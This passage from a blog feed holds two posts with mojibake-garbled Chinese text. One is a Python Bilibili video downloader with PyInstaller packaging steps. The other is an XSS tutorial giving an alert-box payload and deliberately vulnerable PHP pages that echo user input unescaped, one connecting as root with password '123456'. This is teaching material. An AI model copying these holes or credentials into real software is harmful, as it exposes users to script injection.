class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding : utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2021/3/21 16:11</span></span><br><span class="line"><span class="comment"># @Author : wawyw</span></span><br><span class="line"><span class="comment"># @File : bilibili_video.py</span></span><br><span class="line"><span class="comment"># @Software : PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_video_data</span>(<span class="params">html_data</span>):</span></span><br><span class="line">    title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_å“”å“©å“”å“© (ã‚œ-ã‚œ)ã¤ãƒ­ å¹²æ¯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    json_data = re.findall(<span class="string">r&#x27;&lt;script&gt;window.__playinfo__=(.*?)&lt;/script&gt;&#x27;</span>,html_data)[<span class="number">0</span>]</span><br><span class="line">    json_data = json.loads(json_data)</span><br><span class="line">    audio_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;audio&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;video&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_data = [title, audio_url, video_url]</span><br><span class="line">    <span class="keyword">return</span> video_data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span>(<span class="params">file_name,audio_url,video_url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨ä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„éŸ³é¢‘...&quot;</span>)</span><br><span class="line">    audio_data = send_request(audio_url).content</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„éŸ³é¢‘ï¼&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨ä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„è§†é¢‘...&quot;</span>)</span><br><span class="line">    video_data = send_request(video_url).content</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„è§†é¢‘ï¼&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp3&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(audio_data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp4&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(video_data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_data</span>(<span class="params">video_name</span>):</span></span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp3&quot;</span>,<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp4&quot;</span>,<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨åˆå¹¶ &quot;</span> + video_name + <span class="string">&quot;çš„è§†é¢‘...&quot;</span>)</span><br><span class="line">    subprocess.call(<span class="string">&quot;ffmpeg -i 1.mp4 -i 1.mp3 -c:v copy -c:a aac -strict experimental output.mp4&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">    os.rename(<span class="string">&quot;output.mp4&quot;</span>, video_name + <span class="string">&quot;.mp4&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆåˆå¹¶ &quot;</span> + video_name + <span class="string">&quot;çš„è§†é¢‘ï¼&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&quot;è¾“å…¥bilibiliè§†é¢‘å¯¹åº”çš„é“¾æ¥å³å¯ä¸‹è½½ï¼š&quot;</span>)</span><br><span class="line">    html_data = send_request(url).text</span><br><span class="line">    video_data = get_video_data(html_data)</span><br><span class="line">    save_data(video_data[<span class="number">0</span>],video_data[<span class="number">1</span>],video_data[<span class="number">2</span>])</span><br><span class="line">    merge_data(video_data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>æ•ˆæœï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322010945179.png" alt="image-20210322010945179"></p><blockquote><p>è™½è¯´è¿™æ¬¡æ˜¯å°†ç™½å«–è¿›è¡Œåˆ°åº•äº†ï¼Œä½†Bç«™UPä¸»ä»¬åˆ›ä½œè§†é¢‘ç¡®å®ä¸æ˜“ï¼Œæˆ‘ä»¬ä¹Ÿä»ä¸­æ”¶è·å¾ˆå¤šï¼Œèƒ½ä¸‰è¿è¿˜æ˜¯è¦å¤šå¤šæ”¯æŒä¸‹~</p></blockquote><hr><h1 id="æ‰“åŒ…æˆexe"><a href="#æ‰“åŒ…æˆexe" class="headerlink" title="æ‰“åŒ…æˆexe"></a>æ‰“åŒ…æˆexe</h1><p>é¦–å…ˆæˆ‘ä»¬è¦å…ˆå®‰è£…Pyinstallerï¼Œç›´æ¥åœ¨cmdä½¿ç”¨pipå‘½ä»¤</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pyinstaller </span><br></pre></td></tr></table></figure><p>ç„¶åï¼ŒæŠŠffmpegå’Œpyæ–‡ä»¶æ”¾ç½®åˆ°åŒä¸€æ–‡ä»¶å¤¹ä¸‹ã€‚</p><p>å› ä¸ºffmpegæ˜¯è¦ä¸€èµ·æ‰“åŒ…çš„ï¼Œéœ€è¦å¯¹ä»£ç ä¸­çš„ç›¸åº”ç›®å½•åšå°å¹…ä¿®æ”¹ã€‚ä¿®æ”¹åçš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_video_data</span>(<span class="params">html_data</span>):</span></span><br><span class="line">    title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_å“”å“©å“”å“© (ã‚œ-ã‚œ)ã¤ãƒ­ å¹²æ¯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    json_data = re.findall(<span class="string">r&#x27;&lt;script&gt;window.__playinfo__=(.*?)&lt;/script&gt;&#x27;</span>,html_data)[<span class="number">0</span>]</span><br><span class="line">    json_data = json.loads(json_data)</span><br><span class="line">    audio_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;audio&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;video&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_data = [title, audio_url, video_url]</span><br><span class="line">    <span class="keyword">return</span> video_data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span>(<span class="params">file_name,audio_url,video_url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨ä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„éŸ³é¢‘...&quot;</span>)</span><br><span class="line">    audio_data = send_request(audio_url).content</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„éŸ³é¢‘ï¼&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨ä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„è§†é¢‘...&quot;</span>)</span><br><span class="line">    video_data = send_request(video_url).content</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„è§†é¢‘ï¼&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp3&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(audio_data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp4&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(video_data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_data</span>(<span class="params">video_name</span>):</span></span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp3&quot;</span>,<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp4&quot;</span>,<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    shutil.move(<span class="string">&quot;1.mp3&quot;</span>,<span class="string">&quot;ffmpeg/bin/1.mp3&quot;</span>)</span><br><span class="line">    shutil.move(<span class="string">&quot;1.mp4&quot;</span>,<span class="string">&quot;ffmpeg/bin/1.mp4&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨åˆå¹¶ &quot;</span> + video_name + <span class="string">&quot;çš„è§†é¢‘...&quot;</span>)</span><br><span class="line">    os.chdir(<span class="string">&quot;ffmpeg/bin/&quot;</span>)</span><br><span class="line">    subprocess.call(<span class="string">&quot;ffmpeg -i 1.mp4 -i 1.mp3 -c:v copy -c:a aac -strict experimental output.mp4&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">    os.rename(<span class="string">&quot;output.mp4&quot;</span>, video_name + <span class="string">&quot;.mp4&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    shutil.move(<span class="string">&quot;%s.mp4&quot;</span>%video_name,<span class="string">&quot;../../%s.mp4&quot;</span>%video_name)</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆåˆå¹¶ &quot;</span> + video_name + <span class="string">&quot;çš„è§†é¢‘ï¼&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&quot;è¾“å…¥bilibiliè§†é¢‘å¯¹åº”çš„é“¾æ¥å³å¯ä¸‹è½½ï¼š\n&quot;</span>)</span><br><span class="line">    html_data = send_request(url).text</span><br><span class="line">    video_data = get_video_data(html_data)</span><br><span class="line">    save_data(video_data[<span class="number">0</span>],video_data[<span class="number">1</span>],video_data[<span class="number">2</span>])</span><br><span class="line">    merge_data(video_data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å¥½åï¼Œcmdåˆ‡æ¢åˆ°æˆ‘ä»¬åˆšåˆšæ”¾æ–‡ä»¶çš„ç›®å½•ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pyinstall -F -i bilibili.ico bilibili_video_download.py</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210417235918679.png" alt="image-20210417235918679"></p><p>ï¼ˆè¿™é‡Œ<code>-i bilibili.ico</code>æ˜¯å¯¹ç¨‹åºçš„å›¾æ ‡è¿›è¡Œè®¾ç½®ï¼Œä¸ºå¯é€‰é¡¹ï¼‰</p><p>æ‰§è¡Œå®Œæ¯•ä¼šå‘ç°å½“å‰ç›®å½•å¤šäº†å‡ ä¸ªæ–‡ä»¶å¤¹ï¼Œæ‰“å¼€å…¶ä¸­åä¸ºdistçš„æ–‡ä»¶å¤¹ï¼Œé‡Œé¢ç”Ÿæˆäº†ä¸€ä¸ªåä¸º<code>bilibili_video_download</code>çš„exeåº”ç”¨ç¨‹åºï¼Œå¹¶ä¸”å›¾æ ‡ä¹Ÿæ˜¯æˆ‘ä»¬è®¾ç½®çš„å›¾æ¡ˆã€‚ï¼ˆè¿™é‡Œè¦æŠŠexeæ–‡ä»¶ç§»åŠ¨åˆ°ä¸Šä¸€çº§ç›®å½•ï¼Œå³ffmpegçš„åŒçº§ç›®å½•ï¼‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418000736927.png" alt="image-20210418000736927"></p><p>ç‚¹å‡»è¿è¡Œexeåº”ç”¨ç¨‹åºï¼Œè¾“å…¥è§†é¢‘URLå³å¯ä¸‹è½½ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418001107366.png" alt="image-20210418001107366"></p><p>ä¸‹è½½å®Œæ¯•ï¼</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418001228931.png" alt="image-20210418001228931"></p><p>æ‰€æœ‰ç›¸å…³èµ„æºå·²æ”¾åœ¨ä¸‹é¢çš„é“¾æ¥ä¸­ï¼Œéœ€è¦çš„æœ‹å‹å¯ä»¥è‡ªå–ã€‚ï¼ˆä¸‹è½½åè§£å‹æ­¤å‹ç¼©åŒ…ï¼Œè¿è¡Œ<code>bilibili_video_download.exe</code>å¹¶è¾“å…¥è§†é¢‘å¯¹åº”é“¾æ¥å³å¯å®Œæˆè§†é¢‘ä¸‹è½½ ï¼‰</p><blockquote><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1P1451Mmg2FRQBnieSrUCQg">https://pan.baidu.com/s/1P1451Mmg2FRQBnieSrUCQg</a><br>æå–ç ï¼š1234<br>å¤åˆ¶è¿™æ®µå†…å®¹åæ‰“å¼€ç™¾åº¦ç½‘ç›˜æ‰‹æœºAppï¼Œæ“ä½œæ›´æ–¹ä¾¿å“¦</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹è¯­è¨€ </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> çˆ¬è™« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSSæ¼æ´å­¦ä¹ </title>
      <link href="posts/54823.html"/>
      <url>posts/54823.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>å¯æä¾›XSSç»ƒä¹ çš„é¶åœº</p><p>åœ¨çº¿ï¼š</p><p><a href="https://xss.haozi.me/">https://xss.haozi.me/</a></p><p><a href="https://xssaq.com/yx/index.php">https://xssaq.com/yx/index.php</a></p><p>éœ€ä¸‹è½½å®‰è£…ï¼š</p><p><a href="https://dvwa.co.uk/">DVWA</a></p><p><a href="https://github.com/zhuifengshaonianhanlu/pikachu">pikachu</a></p></blockquote><h1 id="XSSç®€ä»‹"><a href="#XSSç®€ä»‹" class="headerlink" title="XSSç®€ä»‹"></a>XSSç®€ä»‹</h1><p>è·¨ç«™è„šæœ¬(Cross-site Scripting )æ”»å‡»ï¼Œæ”»å‡»è€…é€šè¿‡ç½‘ç«™æ³¨å…¥ç‚¹æ³¨å…¥å®¢æˆ·ç«¯å¯æ‰§è¡Œè§£æçš„payloadï¼ˆè„šæœ¬ä»£ç ï¼‰ï¼Œå½“ç”¨æˆ·è®¿é—®ç½‘é¡µæ—¶ï¼Œæ¶æ„payloadè‡ªåŠ¨åŠ è½½å¹¶æ‰§è¡Œï¼Œä»¥è¾¾åˆ°æ”»å‡»è€…ç›®çš„ï¼ˆçªƒå–cookieã€æ¶æ„ä¼ æ’­ã€é’“é±¼æ¬ºéª—ç­‰ï¼‰ã€‚ä¸ºäº†é¿å…CSSï¼ˆå±‚å æ ·å¼è¡¨ï¼‰ç›¸æ··æ·†ï¼Œé€šå¸¸ç§°å®ƒä¸ºâ€XSSâ€ã€‚</p><p>å½¢æˆXSSæ¼æ´çš„ä¸»è¦åŸå› æ˜¯ç¨‹åºå¯¹è¾“å…¥å’Œè¾“å‡ºæ²¡æœ‰åšåˆé€‚çš„å¤„ç†ï¼Œå¯¼è‡´â€œç²¾å¿ƒæ„é€ â€çš„å­—ç¬¦è¾“å‡ºåœ¨å‰ç«¯æ—¶è¢«æµè§ˆå™¨å½“ä½œæœ‰æ•ˆä»£ç è§£ææ‰§è¡Œä»è€Œäº§ç”Ÿå±å®³ã€‚</p><h1 id="XSSç±»å‹"><a href="#XSSç±»å‹" class="headerlink" title="XSSç±»å‹"></a>XSSç±»å‹</h1><h2 id="åå°„å‹XSS"><a href="#åå°„å‹XSS" class="headerlink" title="åå°„å‹XSS"></a>åå°„å‹XSS</h2><p>åå°„å‹XSSéæŒä¹…åŒ–ï¼Œéœ€è¦æ¬ºéª—ç”¨æˆ·è‡ªå·±å»ç‚¹å‡»é“¾æ¥æ‰èƒ½è§¦å‘XSSä»£ç ï¼ˆæœåŠ¡å™¨ä¸­æ²¡æœ‰è¿™æ ·çš„é¡µé¢å’Œå†…å®¹ï¼‰ï¼Œä¸€èˆ¬å®¹æ˜“å‡ºç°åœ¨æœç´¢é¡µé¢ï¼Œåœ¨å‘ç”Ÿè¯·æ±‚æ—¶ï¼ŒXSSä»£ç å‡ºç°åœ¨è¯·æ±‚URLä¸­ï¼Œä½œä¸ºå‚æ•°æäº¤åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨è§£æå¹¶å“åº”ã€‚å“åº”ç»“æœä¸­åŒ…å«XSSä»£ç ï¼Œæœ€åæµè§ˆå™¨è§£æå¹¶æ‰§è¡Œã€‚ä»æ¦‚å¿µä¸Šå¯ä»¥çœ‹å‡ºï¼Œåå°„å‹XSSä»£ç æ˜¯é¦–å…ˆå‡ºç°åœ¨URLä¸­çš„ï¼Œç„¶åéœ€è¦æœåŠ¡ç«¯è§£æï¼Œæœ€åéœ€è¦æµè§ˆå™¨è§£æä¹‹åXSSä»£ç æ‰èƒ½å¤Ÿæ”»å‡»ã€‚è¿™ç±»æ”»å‡»æ‰‹æ®µå¤§å¤šæ•°æ˜¯ç”¨æ¥ç›—å–ç”¨æˆ·çš„Cookieä¿¡æ¯ã€‚</p><p>æµç¨‹å›¾å¦‚ä¸‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210108094651918.png"></p><p>æµ‹è¯•ä»£ç <code>reflected.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;åå°„å‹XSSæµ‹è¯•&lt;h2&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;reflected.php&quot;</span> method=<span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line">    What<span class="string">&#x27;s your name?</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">    $name = $_GET[&#x27;</span>name<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">    echo &quot;Hello! &quot;.$name;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªç®€å•çš„ç”¨æˆ·æäº¤çš„é¡µé¢ï¼Œç”¨æˆ·å¯ä»¥åœ¨æ­¤æäº¤æ•°æ®ï¼Œæ•°æ®æäº¤ä¹‹åç»™åå°å¤„ç†ï¼Œå†ç”±å‰ç«¯æ˜¾ç¤ºã€‚æ‰€ä»¥è¿™ç§æ¼æ´æ•°æ®æµå‘æ˜¯ï¼š å‰ç«¯â€“&gt;åç«¯â€“&gt;å‰ç«¯ã€‚å¾ˆæ˜æ˜¾ï¼Œæ­¤è¿‡ç¨‹ä¸­æ²¡æœ‰å¯¹è¾“å…¥çš„å‚æ•°ä½œä»»ä½•è¿‡æ»¤ï¼Œå­˜åœ¨XSSã€‚<img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210315233801938.png" alt="image-20210315233801938"></p><p>æˆ‘ä»¬å¯ä»¥åœ¨è¾“å…¥æ¡†æˆ–URLä¸­å†™å…¥<code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>è¿›è¡Œæµ‹è¯•ï¼Œå›è½¦åå¯è§xsså¼¹çª—ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210315234322375.png" alt="image-20210315234322375"></p><p>æŸ¥çœ‹ç½‘é¡µæºä»£ç å¯ä»¥å‘ç°ï¼Œæ’å…¥è¿›å»çš„jsè„šæœ¬è¢«å®Œå®Œå…¨å…¨çš„æ‰§è¡Œäº†ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210315234502018.png" alt="image-20210315234502018"></p><h2 id="å­˜å‚¨å‹XSS"><a href="#å­˜å‚¨å‹XSS" class="headerlink" title="å­˜å‚¨å‹XSS"></a>å­˜å‚¨å‹XSS</h2><p>å­˜å‚¨å‹XSSåˆç§°ä¸ºæŒä¹…å‹XSSï¼Œæ”»å‡»è€…å°†XSSä»£ç å‘é€ç»™äº†æœåŠ¡å™¨ï¼Œè€ŒæœåŠ¡å™¨æ²¡æœ‰å¯¹è¿™äº›ä»£ç åšä»»ä½•å¤„ç†å°±ç›´æ¥å­˜å‚¨åœ¨äº†æ•°æ®åº“ä¸­ï¼Œå½“ä¸‹ä¸€ä¸ªç”¨æˆ·è®¿é—®ç½‘ç«™æ—¶ç›´æ¥ä»æ•°æ®åº“è°ƒç”¨å‡ºæ¥ä¼ ç»™å‰ç«¯ï¼Œæµè§ˆå™¨è§£æXSSä»£ç å°±é€ æˆäº†XSSæ”»å‡»ã€‚å¸¸è§çš„æ”»å‡»ç‚¹åœ¨ä¸ªäººä¿¡æ¯ã€å‘è¡¨æ–‡ç« ã€ç•™è¨€æ¿ç­‰åœ°æ–¹ã€‚è¿™ç§XSSæ¯”è¾ƒå±é™©ï¼Œå®¹æ˜“é€ æˆè •è™«ï¼Œç›—çªƒcookieç­‰ã€‚</p><p>æµç¨‹å›¾å¦‚ä¸‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210108094756253.png"></p><p>æµ‹è¯•ä»£ç <code>stored.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;XSS&lt;/title&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;å­˜å‚¨å‹XSSæµ‹è¯•&lt;h2&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;border: 1px solid&quot;</span>&gt;</span><br><span class="line">        &lt;form action=<span class="string">&quot;stored.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        name:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">        commentsï¼š&lt;textarea name=<span class="string">&quot;comment&quot;</span>&gt;&lt;/textarea&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;å‘è¡¨&quot;</span> /&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;p&gt;è¯„è®ºåŒºï¼š&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$conn</span> = mysqli_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">    mysqli_select_db(<span class="variable">$conn</span>,<span 